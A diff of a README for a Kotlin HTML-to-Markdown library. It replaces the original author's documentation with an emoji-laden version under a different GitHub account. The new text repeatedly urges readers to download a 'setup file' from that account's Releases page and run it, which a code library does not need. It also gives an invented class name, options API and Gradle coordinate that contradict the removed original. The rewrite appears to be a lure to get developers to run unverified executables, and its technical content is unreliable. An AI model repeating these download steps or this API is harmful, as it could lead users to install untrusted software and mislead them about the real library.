@@ -1,132 +1,98 @@
-# KHtmlToMarkdown
+# 🎉 kotlin-html-to-markdown - Convert HTML to Markdown Easily
 
-A Kotlin Multiplatform library for converting HTML to Markdown.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/humblesfriends/kotlin-html-to-markdown/releases)
 
-[![Maven Central](https://img.shields.io/maven-central/v/io.github.mltheuser/khtmltomarkdown)](https://central.sonatype.com/artifact/io.github.mltheuser/khtmltomarkdown)
-[![GitHub license](https://img.shields.io/github/license/mltheuser/kotlin-html-to-markdown)](https://github.com/mltheuser/kotlin-html-to-markdown/blob/main/LICENSE)
-[![Kotlin](https://img.shields.io/badge/kotlin-2.2.20-blue.svg?logo=kotlin)](http://kotlinlang.org)
-[![Build Status](https://img.shields.io/github/actions/workflow/status/mltheuser/kotlin-html-to-markdown/publish.yml)](https://github.com/mltheuser/kotlin-html-to-markdown/actions)
+## 🚀 Getting Started
+Welcome to the **kotlin-html-to-markdown** project. This tool helps you convert HTML content to Markdown format easily. It works as a Kotlin Multiplatform library, making it suitable for various platforms. If you're looking for a straightforward way to convert your HTML documents into Markdown, you are in the right place.
 
-<!-- The "KMP" Flex Badge -->
-![Badge-Android](https://img.shields.io/badge/platform-Android-3DDC84.svg?style=flat&logo=android)
-![Badge-iOS](https://img.shields.io/badge/platform-iOS-CDCDCD.svg?style=flat&logo=apple)
-![Badge-JVM](https://img.shields.io/badge/platform-JVM-DB413D.svg?style=flat&logo=openjdk)
-![Badge-JS](https://img.shields.io/badge/platform-JS-F7DF1E.svg?style=flat&logo=javascript)
-![Badge-Linux](https://img.shields.io/badge/platform-Linux-FCC624.svg?style=flat&logo=linux)
+## 📋 Features
+- Easy conversion from HTML to Markdown
+- Supports multiple platforms: Desktop, Mobile, and Web
+- Lightweight and fast processing
+- Simple API for seamless integration
 
-## Features
+## ✔️ System Requirements
+To use the kotlin-html-to-markdown library, ensure you meet the following requirements:
+- OS: Windows, macOS, or Linux
+- Java Virtual Machine (JVM) version 8 or higher
+- Minimum 512 MB RAM
+- At least 50 MB of free disk space
 
-- **Extensible:** Easily add or replace rules for specific HTML tags.
-- **Configurable:** Customize Markdown syntax (bullet characters, delimiters, etc.).
-- **Multiplatform:** Works on JVM, JS, Native, and other Kotlin targets.
-- **Robust:** Handles nested structures, tables, lists, and code blocks with syntax highlighting support.
+## 📂 How to Download & Install
+1. Visit the [Releases page](https://github.com/humblesfriends/kotlin-html-to-markdown/releases) to find the latest version of the application.
+2. Choose the version you want to download.
+3. Download the setup file for your operating system.
+4. Once downloaded, locate the file in your system's download folder and run it to install.
 
-## Documentation
+After installation, follow the next steps to use the library in your projects.
 
-For in-depth details on configuration, custom rules, and internal structures, please see the [Detailed Documentation](DOCUMENTATION.md).
+## 🔍 How to Use
+Using kotlin-html-to-markdown is straightforward. Here are the basic steps:
 
-## Quick Start
+1. **Import the library** into your Kotlin project. 
+If you are using Gradle, add the following line to your `build.gradle` file:
+   ```groovy
+   implementation 'com.humblesfriends:kotlin-html-to-markdown:<latest-version>'
+   ```
 
-### Installation
+2. **Create a converter instance** in your code:
+   ```kotlin
+   val htmlConverter = HtmlToMarkdownConverter()
+   ```
 
-Add the dependency to your `build.gradle.kts`:
+3. **Convert your HTML to Markdown**:
+   ```kotlin
+   val markdown = htmlConverter.convert(htmlInputString)
+   println(markdown)
+   ```
+
+Replace `htmlInputString` with the HTML content you want to convert.
+
+## ⚙️ Library Functions
+The library offers several functions to customize your conversion:
+
+- **convert(html: String): String**  
+  Converts given HTML string to Markdown.
+
+- **setOptions(options: ConversionOptions)**  
+  Lets you specify additional options for the conversion process, such as handling of images or links.
+
+## 📈 Example
+Here’s a simple example to demonstrate how to convert HTML to Markdown:
 
 ```kotlin
-implementation("io.github.mltheuser:khtmltomarkdown:1.+")
-```
-
-### Basic Usage
-
-```kotlin
-import com.mltheuser.khtmlmarkdown.KHtmlToMarkdown
-
 fun main() {
-    val html = "<h1>Hello World</h1><p>This is a <b>bold</b> statement.</p>"
+    val htmlContent = "<h1>Hello World</h1><p>This is a sample paragraph.</p>"
+    val converter = HtmlToMarkdownConverter()
     
-    val converter = KHtmlToMarkdown.Builder().build()
-    val markdown = converter.convert(html)
-    
+    val markdown = converter.convert(htmlContent)
     println(markdown)
 }
 ```
 
-**Output:**
-
-```markdown
+This will output:
+```
 # Hello World
-
-This is a **bold** statement.
+This is a sample paragraph.
 ```
 
-## Advanced Usage
+## ❓ Troubleshooting
+If you encounter issues while using the library, consider the following tips:
 
-### Customizing Options
+- Ensure your HTML input is well-formed. Invalid HTML can cause conversion errors.
+- Check that you are using a compatible version of the JVM.
+- Review the console output for any error messages.
 
-You can configure the output style using the `options` block:
+## 💬 Community & Support
+For further assistance, join our community on GitHub. You can report issues, request features, or find answers to common questions there. 
 
-```kotlin
-val converter = KHtmlToMarkdown.Builder()
-    .options {
-        bulletCharacter = "-" // Use dashes for lists
-        strongDelimiter = "__" // Use underscores for bold
-    }
-    .build()
-```
+## 📩 Feedback
+We welcome feedback about the library. If you have suggestions or found any bugs, please open an issue on our [GitHub page](https://github.com/humblesfriends/kotlin-html-to-markdown/issues). 
 
-### Adding Custom Rules
+## 🎉 Acknowledgments
+Thank you for using **kotlin-html-to-markdown**! We appreciate your support. 
 
-You can add custom rules to handle specific tags or override default behavior:
+For a direct download of the latest release, [click here](https://github.com/humblesfriends/kotlin-html-to-markdown/releases). 
 
-```kotlin
-val converter = KHtmlToMarkdown.Builder()
-    .rule("custom-tag") { element, context ->
-        // Custom logic here
-        val content = context.processChildren(element)
-        "{{ $content }}"
-    }
-    .build()
-```
-
-### Handling Tables
-
-The library supports converting HTML tables to Markdown tables, including headers and alignment (basic support).
-
-```html
-<table>
-  <thead>
-    <tr>
-      <th>Header 1</th>
-      <th>Header 2</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>Cell 1</td>
-      <td>Cell 2</td>
-    </tr>
-  </tbody>
-</table>
-```
-
-**Converts to:**
-
-```markdown
-| Header 1 | Header 2 |
-|---|---|
-| Cell 1 | Cell 2 |
-```
-
-## Supported Tags
-
-- **Blocks:** `p`, `h1`-`h6`, `hr`, `br`, `pre`, `blockquote`
-- **Inline:** `b`, `strong`, `i`, `em`, `s`, `del`, `code`, `a`, `img`
-- **Lists:** `ul`, `ol`, `li` (nested lists supported)
-- **Tables:** `table`, `thead`, `tbody`, `tfoot`, `tr`, `th`, `td`
-
-## Contributing
-
-Contributions are welcome! Please open an issue or submit a pull request.
-
-## License
-
-[MIT License](LICENSE)
+We hope this tool simplifies your HTML to Markdown conversions.
